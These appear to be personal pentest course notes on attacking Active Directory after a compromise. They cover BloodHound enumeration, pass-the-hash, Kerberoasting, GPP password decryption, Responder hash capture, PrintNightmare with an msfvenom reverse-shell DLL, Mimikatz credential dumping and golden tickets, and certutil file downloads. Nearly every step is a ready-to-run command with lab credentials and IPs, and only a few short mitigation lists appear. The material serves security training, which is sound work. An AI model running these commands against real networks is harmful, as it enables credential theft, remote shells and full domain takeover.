## Post-Compromise Enumeration
### Downloading PowerView:
Download the PowerView.ps1 from https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 into the target machine that is been exploited.

### PowerView
- PowerView is super usefull after access the target machine and you want to enumerate any type of information about the netwrok, computer or user.
- From the cmd run "powershell -ep bypass" to allow powershell execution Policy bypass. Not doing this would prever running files out of the normal in powershell.

- To run and use PowerView run ". .\\PowerView.ps1"
- Get-Domain; Get-DomainControler; Get-NetComputer | select operatingsystem ,  logoncount ; Get-NetGroup -GroupName ****admin**** ; Invoke-ShareFinder - are some examples
- PowerView Cheat Sheet: 
- 
- 
- [https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)

### Bloodhound
Can be used to get data on the computer and domain you have attacked. 

- On the target machine download the file SharpHound.ps1", run "powershell -ep bypass" and after running the file, run "Invoke-BloodHound -CollectionMethod All -Domain MARVEL.local -ZipFilename file.zip". Get the zip file to the attacking linuz machine and load the data into bloodhoud. 



## Post-Compromise Attacks
This attacks can only happen after having a compromised target. These are some of the best attacks that we can leverage once we compromise a machine on a network. 
### Pass the Password/hash attack
#### Pass the Password attack
- This attack is focused on when you are able to dump the hashes "hashdump" or have access to the user credentials. This attack uses "crackmapexec" and if you have one of the 2 (hash/password) you will be able to use them to login to the same user inside the network on other machines. 
- To download use "sudo apt install crackmapexec"
- To run use "crackmapexec 192.168.57.0/24 -u fcastel -d Marvel.local -p Password1 --sam". --sam to attempt dumping sam hashes, not required. 
- When using this you will have the ip address, name of the machine, user and password used.
![[Pasted image 20230601105422.png]]
- We can now use psexec.py to gain sheel to another computer in the network with the same user credentials. "sudo psexec.py marvel/fcastel:Password1@192.168.57.142" or using metasploit using psexec.

#### Dumping Hashes with secretsdump.py
- This is stored in "/impacket/examples". 
- Use "python3 secretsdump.py marvel/fcastel:Password1@192.168.138.150"
![[Pasted image 20230601113339.png]]
###### Cracking NTLM Hashes with Hashcat (We can not use NTLMV2 for hash pass)
- We can use the hashes and try to crack them using hashcat, ntlm hashes, module 1000. 
- On windows we can use "hashcat64.exe -m 1000 hashes.txt rockyou.txt -O"




#### Pass the hash attack
- To run use "crackmapexec 192.168.57.0/24 -u "Frank Castel" -H "hash" --local-auth". 
##### Pass the hash attack mitigation
- Limit the account re-use
- Utilize strong passwords
- Privilege Access management

### Token Impersonation
#### What are tokens?
- Temporary keys that allow you to acces to a system/network withouth having to provide credentials each time you access a file. Think of cookies for computers.
There are 2 types:
- Delegate - Created for loggin into a machine or using remote desktop
- Impersonation - "Non-interactive" such as attaching a network drive or a domain logon script.
#### Token Impersonation
- Use meterpreter to get a meterpreter shell using psexec "use exploit/windows/smb/psexec". Set the rhost, domain, pass, username, target to "native upload" and payload to "windows/x64/meterpreter/reverse_tcp".
- Once inside we can do the usual stuff, "hashdump", sysinfo and getuid. After wer will load incognito using "load incognito".
- Using this tool we can start by "list_tokens -u" to list all the tokens available.
- We can impersonate using "impersonate_token MARVEL\\administrator" and we run "shell" and have a shell as administrator. Using ctrl+c we go ba
- ck but not as in the beginning. You can use "rev2self" to go back as the first meterpreter. 
- The delegate Tokens are a login session so only after loggin in with that user you will be able to list it. That token will exist untill the pc is rebooted.  

#### Token Mitigation
- Limit user/group tokens creation permission
- Account tiaring
- Local admin restriction

### Kerberoasting
#### Overview
![[Pasted image 20230604103614.png]]
- We request a TGT using username and password, normal user not a admin. We then use the TGT to request a TGS. We the use the TGS to request the service and it will be attcahed to the serves hash that we can decrypt. 
- The goal of Kerberoasting is to get the TGS (ticket granting service ticket) and decrypt servers account hash. 
![[Pasted image 20230604104434.png]]
![[Pasted image 20230604104508.png]]


#### Kerberoasting Walk
- We request the TGS using "python GetUserSPNs.py MARVEL.local/pparker:Password1 -dc-ip 192.168.138.200 -request" and we get the kerberos 5 TGS hash. 
- We can search the mnodule for hashcat using "hashcat --help | grep Kerberos" and we run "hashcat64.exe  -m 13100 hash.txt rockyou.txt -O".
- We crack the sqlservice password. 
#### Mitigation
- Strong Password
- Least Privilege

### Group Policy Preferences (GPP) AKA MS14-025
#### Overview
- Group Policy preferences allowed admins to create policies using embedded credentials. 
- These credentials were encrypted and placed in a "cPassword"
- The key was accidentally released
- Patched in MS14-025, but does not prevent previous uses. If and admin stored a group policy preference or embedded credential before the patch was implemented, this will still display a credential to us. 
- Does not come up that often but still important to check. 
#### GPP Walk
- We will use a Hack the Box machine called "Active" https://app.hackthebox.com/machines/148.
- Doing a quick nmap scan we can see a lot of ports open that indicate this is a domain controller. "kerberos, ldap, microsoft'ds"...
- We will focus on 445 microsoft-ds, normally there are sys default folders. Using "smbclient -L \\\\ipaddress\\" and no password.
- We can try to login to replication because is the default one and will allow anonymous access. Using "smbclient \\\\ipaddress\\Replication" 
- In order to download all the files we use "prompt off", "recurse on" and "mget *" and we want the "Groups.xml".
- This file will include the password, domain name and TGS.
- To decrypt the password we use "gpp-decrypt 'hash'".
- We can now use psexec.py or meterpreter to try to login to the machine. But this will not work. We can try kerberosting because we have tgs. Using "Python GetUserSPNs.py active.htb/svc_tgs:Password -dc-ip 10.10.10.100 -request" and we get a krb5tgs password hash. We run a hashcat using "hashcat64.exe  -m 13100 hash.txt rockyou.txt -O" and we get the password of the administrator.
- Now we try psexc.py again but using the administrator credentials "python psexec.py active.htb/AdministratorÇTicketmaster1968@10.10.10.100" and we get shell.


### URL File Attacks
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#scf-and-url-file-attack-against-writeable-share
- https://academy.tcm-sec.com/courses/1152300/lectures/33637401
- This is when you have a compromised user, and that user has a file share access. We can use that access to capture more hashes via responder.
- Create a file on the target machine with "[InternetShortcut] URL=blah WorkingDirectory=blah IconFile=\\myIP\%USERNAME%.icon IconIndex=1"
- We save this file on the share folder that will be attacked. The file name has to contain .url and a @ at the begging, "@test.url".
- Now on our attack machine we load responder using "responder -I eth0 -v". Now if a user access the shared folder the reposponder will get the user hash that accessed it, returning a NTLMV" Hash. 

### PrintNightmare (CVE-2021-1675) Walkthrough
- [https://github.com/cube0x0/CVE-2021-1675](https://github.com/cube0x0/CVE-2021-1675)
- To identify if the target is vulnerable to this attack run "rpcdump.py @192.168.1.10 | egrep 'MS-RPRN|MS-PAR'" and if we get this retun it is vulnerable.
![[Pasted image 20230604124250.png]]
- To run the attack we first need to update impacket. "pip3 uninstall impacket"
"git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install"
- After we need to copy the python code and create that file on our machine. https://github.com/cube0x0/CVE-2021-1675/blob/main/CVE-2021-1675.py
- We have to create a explkoit using msfvenom "sudo msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.138.193 LPORT =5555 -f dll > shell.dll"
- Now load meterpreter and "use multi/handler", set payload to "windows/x64/meterpreter/reverse_tcp", lhost and port to the same. 
- Now we will use impacket to share the shell.dll. On the same directory where the file is run "sudo smbserver.py share 'pwd' -smb2support"
- To run the attack now we run "python3 CVE2021.py marvel.local/fcastel:Password1@192.168.138.150 '\\192.168.138.193\share\shell.dll'" and we get a meterpreter shell on meterpreter. 
- https://academy.tcm-sec.com/courses/1152300/lectures/33637715

### Mimikatz
#### Overview
What is Mimikatz_
- Tool used to view and steal credentials, generate kerberos tickets and leverage attacks. 
- Dump Credentials stored in memory.
- Just a few attacks: Credential dumping, pass-the-hash, golden ticket, etc. 
- [https://github.com/gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz)
- You can download the zip file from https://github.com/gentilkiwi/mimikatz/releases to the domain controller. This is assuming we have compromised it. 
#### Credential Dumping with Mimikatz
- Download and extract the file and run it on the cmd as administrator. 
- run "privilege::debug", and we are looking for a "Privilage 20 OK". This means we have access to debug a process that we would not have access to. 
- Run "sekurlsa::logonpasswords". This returned the comuter name, domain and NTLM hash for all the user log in since the last reboot. 
	- Good note: in the retun we get a section called "wdigest". This would display in plain text the password, but before we need to turn this feature on and wait for the user to login again. 
- To try to dump sam hash run "lsadump::sam", not always will work.
- "lasdumo::lsa /patch" this will retun all the ntlm hashes from the target machine. Local security authority. We can try to crack this hashes or pass the hash around the network or golden ticket attack. 
#### Golden Ticket attack
https://academy.tcm-sec.com/courses/1152300/lectures/24781487
Using the Mimikatz and "lasdumo::lsa /patch" we were able to dump the krb gt, this is the kerberous ticket account. This account allows to generate tickets, if we have the hash of that account we will be able to generate as many kerberost granting tickets and own the whole domain. 
- Run mimikatz, privelege::debug and now we run this to only return the user we want "lasdumo::lsa /inject /name:krbtgt" and save the sid of the domain, ntlm hash.
- Now "kerberos::golden /user:Administartor /domain:marvel.local /sid:'sid of the domain' /krbtgt: 'ntlm hash' /id:500 /ptt", this will retun a 'successfully submited' message and we can run "misc::cmd" to create a cmd with the golden ticket.
- Now we own the whole network we can access anything we want. Try "dir \\THEPUNISHER\c$" and we get the files on thepunisher machine. 
- Now we can download the psexec to the domain controller and gain access to any machine. "psexec.exe \\THEPUNISHER cmd.exe"
- Have a look at Silver ticket because golden are being picked up. 

### Conclusion and Additional Resources
- https://academy.tcm-sec.com/courses/1152300/lectures/24781483
- Active Directory Security Blog: [https://adsecurity.org/](https://adsecurity.org/)

Harmj0y Blog: [http://blog.harmj0y.net/](http://blog.harmj0y.net/)

Pentester Academy Active Directory: [https://www.pentesteracademy.com/activedirectorylab](https://www.pentesteracademy.com/activedirectorylab)
Pentester Academy Red Team Labs: [https://www.pentesteracademy.com/redteamlab](https://www.pentesteracademy.com/redteamlab)
eLS PTX:  [https://elearnsecurity.com/product/ecptx-certification/](https://elearnsecurity.com/product/ecptx-certification/)
### Abusing ZeroLogon
What is ZeroLogon? - [https://www.trendmicro.com/en_us/what-is/zerologon.html](https://www.trendmicro.com/en_us/what-is/zerologon.html)
dirkjanm CVE-2020-1472 - [https://github.com/dirkjanm/CVE-2020-1472](https://github.com/dirkjanm/CVE-2020-1472)
SecuraBV ZeroLogon Checker/tester - [https://github.com/SecuraBV/CVE-2020-1472](https://github.com/SecuraBV/CVE-2020-1472)
https://academy.tcm-sec.com/courses/1152300/lectures/33690015

## Post Exploitation
### File Transfers
- Certutil
	- certutil.exe -urlcache -f http://ipofmymachiine/file.txt file.txt
- HTTP
	- python -m SimpleHTTPServer 80
- Browser
	- Navigate directly to file
- FTP
	- python -m pyftpdlib 21 (from my machine)
	- ftp myIP (on the target machine)
- Linux
	- wget
- Metasploit
	- If you have a meterpreter shell you can use the upload/download feature

### Maintaining Access (Red Team)
- Add a user
	- net user hacker password 123 /add
- Scheduled Tasks
	- Run scheduleme
	- rub schtaskabuse

### Pivoting
https://academy.tcm-sec.com/courses/1152300/lectures/24781514

### Cleaning up
Always leave the machine how it was before.
